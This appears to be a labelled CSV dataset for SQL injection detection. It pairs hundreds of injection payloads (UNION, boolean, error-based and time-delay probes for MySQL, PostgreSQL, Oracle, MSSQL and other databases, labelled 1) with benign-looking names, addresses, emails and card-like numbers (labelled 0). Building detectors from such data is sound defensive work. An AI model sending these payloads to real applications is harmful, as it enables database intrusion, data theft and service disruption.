Query,Label
"1' in boolean mode) and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)#",1
1oca,0
"1)) and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",1
germe,0
c/ castaos 55 6-g,0
"1"");select sleep(5) and (""innk""=""innk",1
"-1999) union all select 1779,1779,1779,1779,1779,1779,1779,1779,1779,1779#",1
aro,0
"passeig gaudi 77, 3-e",0
maials,0
6187378791844475,0
gaylor,0
"1') as fxuk where 6184=6184 and make_set(9292=2785,2785)--",1
bu0ar4,0
kamil,0
2el6s,0
"1"") as crek where 6570=6570 and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",1
09030291p,0
palmario,0
1') and sleep(5) and ('orxt'='orxt,1
"1""))) or 6793=(select 6793 from pg_sleep(5)) and (((""azmf""=""azmf",1
-1432 order by 1#,1
despacio,0
"-6478"")) union all select 7087,7087,7087,7087,7087,7087,7087,7087--",1
29807509s,0
"1' and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and 'imqi'='imqi",1
(select (case when (9263=9263) then 1 else 9263*(select 9263 from mysql.db) end)),1
"1 and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x))# mpyu",1
bonifacio,0
"1"") as ltbl where 6395=6395;call regexp_substring(repeat(right(char(2385),0),500000000),null)--",1
"-5700 where 4238=4238 union all select 4238,4238,4238#",1
challee@zonamodelos.co,0
0527381182420490,0
8407,0
vinicio,0
"1' in boolean mode) and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x))#",1
jubinvil,0
1))) or 6793=(select 6793 from pg_sleep(5)) and (((3919=3919,1
8015,0
"1"")) rlike sleep(5) and ((""fzlr""=""fzlr",1
"1%""))) and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and (((""%""=""",1
"c/ jose maria peman, 113,",0
burstein@g-audio.ee,0
enlutada,0
luez.doskey@forohh.cf,0
bossert,0
filicidio,0
"calle ingeniero antonio carbonell, 114, 5d",0
1275136116918867,0
hilom3r0ismo,0
"1) and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)",1
"calle la paz, 88,",0
-1459'))) or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq') and ((('eiet' like 'eiet,1
3407,0
cinca toscano,0
"1' and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null) and 'cotv' like 'cotv",1
cercedilla,0
deglutir,0
3600495561903350,0
6002328199807748,0
"1%""))) waitfor delay '0:0:5' and (((""%""=""",1
hortigela,0
guayabo,0
8069899417976960,0
"1) and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (2868=2868",1
"1"")) as fmul where 7827=7827;waitfor delay '0:0:5'--",1
08776,0
"-3071)) as uiiu where 8910=8910 union all select 8910,8910,8910,8910,8910,8910,8910#",1
4203,0
-3211)) as fsej where 6348=6348 or 9805=3783--,1
"1') where 1600=1600 or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",1
91309762s,0
elsen@whitehat.td,0
1') where 3893=3893;select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#,1
zack,0
capilla,0
"1)) and elt(1210=1210,sleep(5)) and ((5874=5874",1
"1""))) and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and (((""sdvu"" like ""sdvu",1
grant,0
"1) as tkkn where 7832=7832 (select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0)))--",1
"-4528"") or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq') and (""fxmt"" like ""fxmt",1
"1' in boolean mode);select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4#",1
"1) where 8734=8734 procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",1
"1') and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161) and ('ngxz'='ngxz",1
r14orsi1a,0
2641897026324485,0
82402810c,0
"1""))) and 7533=7533 and (((""alvd"" like ""alvd",1
forbes,0
3358050293817980,0
"1) and make_set(8403=8403,8899)",1
requejo,0
20001,0
95113653m,0
303,0
c28a3iz8,0
tornos,0
jade,0
chanampa coromino,0
3jeno,0
t0aspa70ble,0
efrain,0
1) where 8813=8813;waitfor delay '0:0:5'--,1
delle,0
19196,0
1' and (3423=7789)*7789 and 'pdia' like 'pdia,1
3375572623430817,0
"1"")) or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)) and ((""ozvp""=""ozvp",1
5936907680257741,0
9370319487845203,0
"-5131'))) union all select 4854,4854,4854,4854,4854,4854,4854#",1
"1) or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666)",1
ilana,0
lubin,0
40359,0
"1"" and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5) and ""kfps""=""kfps",1
1)));select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#,1
06393,0
"saus, camallera i llampaies",0
1)) order by 1--,1
gaulle,0
arcnida,0
winifred5,0
"doctor diego madrazo, 180",0
28287163s,0
8485,0
carminati@granbretana.com.uk,0
higuera de la serena,0
barcario,0
"carrer pompeu fabra, 151,",0
"1%"")));select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",1
2191,0
1' where 4134=4134 and 1102=6300--,1
karin,0
"1' where 2123=2123 or 8384=like('abcdefg',upper(hex(randomblob(500000000/2))))--",1
biener@926.bo,0
grubel8@albeiteria.kw,0
selj@ebaz.travel,0
"enparantza concordia 47,",0
"1""))) or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x) and (((""ymhg""=""ymhg",1
snelgrov,0
"1' where 4945=4945;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",1
arbeca,0
windham,0
3600920272663929,0
manzanilla,0
"c/ madre castisima, s/n",0
wolfe,0
"1') as dwgv where 1525=1525 union all select null,null--",1
sugesto,0
retallac,0
"1"" and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ""pmpk"" like ""pmpk",1
daigneau,0
och*avero,0
7671154062280390,0
44141,0
brewton,0
46725,0
jacobsen,0
makeda,0
"-2602' union all select 5715,5715,5715,5715,5715,5715,5715,5715,5715--",1
"1%""));select (case when (1499=4923) then 1499 else 1/(select 0) end)--",1
"-3710)) union all select 5770,5770,5770,5770,5770,5770,5770#",1
1');select pg_sleep(5)--,1
"1'+(select 'mxlb' where 4900=4900;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null))+'",1
5256575784174966,0
"1') or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)",1
"1"") union all select null,null,null#",1
aana,0
"-4465%' union all select 6196,6196,6196,6196,6196,6196,6196,6196--",1
"escritor carrillo lasso, 37",0
sanchon vilavend,0
"-1772)) or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((8904=8904",1
"1 or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null)# tcrm",1
"1 or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)-- ztzu",1
trastabilln,0
yoselin,0
"1"")) as klie where 2840=2840 or 8514=benchmark(5000000,md5(0x544d5a4c))#",1
"-4033')) or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (('ouup'='ouup",1
1 and sleep(5)-- ruuv,1
sabu@aridossanchez.lt,0
"-7006' where 6966=6966 union all select 6966,6966,6966,6966#",1
95843081b,0
1') or sleep(5),1
c/ mar caspio 9 13-g,0
"roure, 43, 3?d",0
"1"") where 6255=6255 and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71))--",1
tcito,0
"c/ el perellonet 5,",0
rocheman@sindns.er,0
ibero,0
"antigua de ancora s/n,",0
"calle don juan de malaga, 170,",0
"1%'));select * from generate_series(5846,5846,case when (5846=5227) then 1 else 0 end) limit 1--",1
"1)) as spdf where 8554=8554 or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5)--",1
"1'||(select 'kgjk' where 3530=3530 and 3580=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",1
"-5945'))) union all select 4266,4266,4266,4266,4266--",1
peart,0
larisa,0
desamparados,0
"1') union all select null,null,null,null,null#",1
"1'+(select pepf where 5071=5071 or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",1
"1"")) or elt(6272=6272,sleep(5)) and ((""tvla""=""tvla",1
6138,0
6448,0
"1"") rlike (select * from (select(sleep(5)))sgvo) and (""fkmh""=""fkmh",1
forns rigall,0
"-9795) as wrgs where 5427=5427 union all select 5427,5427,5427,5427,5427,5427--",1
1')) order by 1#,1
marcelin solivera,0
18129,0
liesemer,0
-3613%') or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and ('%'=',1
0928851427911664,0
"1 or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)# ehsr",1
00041731d,0
70385522w,0
1') as ulbr where 7233=7233 and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--,1
1)) as kiqk where 7366=7366 and (select * from (select(sleep(5)))gcrr)#,1
matlock,0
08192,0
zoel,0
"1"";select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",1
"1) as zbha where 9700=9700 or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",1
grimble,0
1972,0
plza. euzkaltzandia 56 2-b,0
cortie,0
wanda,0
"1%""))) and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null) and (((""%""=""",1
"1%') or elt(6272=6272,sleep(5)) and ('%'='",1
cercs,0
franklyn,0
12018831c,0
23,0
9ar5i04o,0
"1""))) order by 1#",1
"-7876%') union all select 3909,3909,3909,3909,3909#",1
"-8783')) union all select 4834,4834,4834,4834,4834,4834,4834,4834,4834--",1
"1') and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and ('xfmq'='xfmq",1
"-3666""))) union all select 4136,4136,4136--",1
"1' where 9206=9206;select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",1
6877205573294951,0
tronchuda,0
"1') as rqzz where 4987=4987 or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null)--",1
montoya,0
9336642316147892,0
47689,0
7402575875977830,0
4550615091902563,0
"1') or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)) and ('lbwh'='lbwh",1
1)) as hxtp where 5478=5478 and 8594=(select 8594 from pg_sleep(5))--,1
bernay3@la-sexta-f1.mm,0
1 waitfor delay '0:0:5'--,1
"1"")) as vbpl where 3885=3885 and 6969=(select 6969 from pg_sleep(5))--",1
frailes,0
"1');select count(*) from generate_series(1,5000000)--",1
hoste ustrell,0
"1"") where 9086=9086 or sleep(5)#",1
"1"") where 5196=5196 and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--",1
n4que,0
broussar,0
"1'+(select 'jhce' where 1117=1117 and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5))+'",1
"pl. comercial 54, 5d",0
heal@quadernideilgarda.gob,0
sabinigo,0
"1))) and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5) and (((6578=6578",1
1' or sleep(5) and 'yudo'='yudo,1
panama 128 5-b,0
20100,0
nydia,0
"1')(select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0)))",1
thuthuy,0
4228,0
curul,0
1') where 2753=2753 and (2739=8047)*8047--,1
8ib6a,0
philipa,0
5pio,0
giridhar,0
chung,0
1)));select (case when (3855=3855) then 3855 else 1/(select 0) end)--,1
"1') where 8835=8835 or 8384=like('abcdefg',upper(hex(randomblob(500000000/2))))--",1
genesis,0
-4248 where 3288=3288 or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)--,1
22311,0
"-9941 union all select 1321,1321,1321,1321,1321,1321,1321#",1
19327,0
bartlett@waterflyesp.eh,0
"-4817 union all select 7415,7415,7415,7415,7415,7415,7415,7415,7415#",1
guillermina,0
girones,0
bolly,0
5793462659286586,0
montseny,0
renny,0
"c/ san guillermo, 182",0
de martino valds,0
1)) as ojjk where 3687=3687 and (4833=9218)*9218--,1
1');if(8858=5680) select 8858 else drop function pyuo--,1
97925933y,0
ofere*nte,0
"-5529"" or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq')",1
1' in boolean mode) and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq')#,1
"1%') and make_set(1458=3902,3902) and ('%'='",1
85765253r,0
glido,0
"1' or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)) and 'kjfm'='kjfm",1
bergamasco privado,0
"1%"" or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)) and ""%""=""",1
muelle de astillero 128 5-b,0
san milln/donemiliaga,0
8252,0
lamontag,0
1084102116286517,0
"calle de circulacio de l' oest, 7",0
"1) as bhdj where 4472=4472;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",1
salhany0,0
"1' and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)) and 'lgat' like 'lgat",1
"1%') or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ('%'='",1
40529,0
17493,0
1938425917633091,0
"mesonero romanos, s/n, 2?b",0
"1' and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))",1
"calle del mercat, 153, 7e",0
comn galindez,0
siguemepol0o,0
"1'))(select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and (('rbhe'='rbhe",1
sobermeja,0
"1'))) union all select null,null--",1
rancar,0
-3978 or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)-- mtun,1
08297,0
"1'+(select 'mikf' where 5814=5814 or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",1
"1 and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)-- ixlk",1
"-8203)) as eqlf where 6132=6132 union all select 6132,6132,6132,6132,6132,6132,6132,6132,6132--",1
1' where 9024=9024 rlike (select * from (select(sleep(5)))sgvo)--,1
veronese@prestigecars.tv,0
"1"" and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and ""mbas""=""mbas",1
5515498437464021,0
tarasca,0
1' and 1541=6868#,1
"1"") as tuem where 1328=1328;begin dbms_lock.sleep(5); end--",1
9309,0
15820845l,0
28782647x,0
palter@biosoftware.in,0
"1' where 6905=6905 union all select null,null,null,null,null,null#",1
hampton-bourne@soyandaluz.lv,0
"-4699) as mymz where 3405=3405 or elt(1032=1032,3623)--",1
surai,0
04869,0
karolefs,0
"1"")) and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and ((""qnqb"" like ""qnqb",1
7537,0
"c/ sorbona, 124 12-f",0
ase,0
5a69io99t3,0
grupo cooperativa obreros talleres deusto 147 6?h,0
ibazeta montells,0
dark@ajuntamentbarcelona2-0.fi,0
calle bendicion 160,0
5536600969659944,0
vasilescu.lisi@drogasvirtuales.sc,0
cagnoli,0
gines,0
canut escriba,0
"1%');select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ('%'='",1
tresjuncos,0
"-4869%' union all select 5729,5729,5729--",1
discoro,0
f5-c21s7,0
"-3081""))) or 3736=1899",1
09840824k,0
"1"";select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and ""psbz""=""psbz",1
"-4286%""))) union all select 2229,2229,2229,2229,2229,2229#",1
g53on3a9u56,0
tapani9,0
"-9630%"" union all select 8592,8592,8592,8592--",1
9842153778086197,0
enaciado,0
constante,0
"1%"") and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and (""%""=""",1
bonete,0
0646137347424943,0
"1%"")) and 8635=(select count(*) from generate_series(1,5000000))--",1
"1));iif(5257=5257,1,1/0)",1
"1"")));iif(1718=5436,1,1/0)",1
jovita,0
"calle poligono quintos, 37,",0
vachiran,0
"1"") where 3250=3250 union all select null#",1
farhan,0
"1%""));select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ((""%""=""",1
40592671v,0
rini,0
7545332607068950,0
02314635f,0
"peral, 180 4-b",0
borzani jordan,0
afoscarse,0
